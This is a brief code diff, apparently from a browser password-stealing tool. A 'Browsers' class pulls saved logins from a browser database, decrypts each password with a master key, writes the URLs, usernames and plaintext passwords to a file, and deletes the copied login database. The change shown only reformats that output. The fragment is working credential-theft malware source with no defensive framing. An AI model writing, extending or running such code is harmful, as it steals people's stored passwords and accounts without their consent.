@@ -520,7 +520,10 @@ class Browsers:
                 url, username, password = res
                 password = self.decrypt_password(password, self.masterkey)
                 if url != "":
-                    f.write(f"URL: {url}  Username: {username}  Password: {password}\n")
+                    f.write(f"""
+URL: {url}
+Username: {username}  
+Password: {password}\n""")
         cursor.close()
         conn.close()
         os.remove(loginvault)
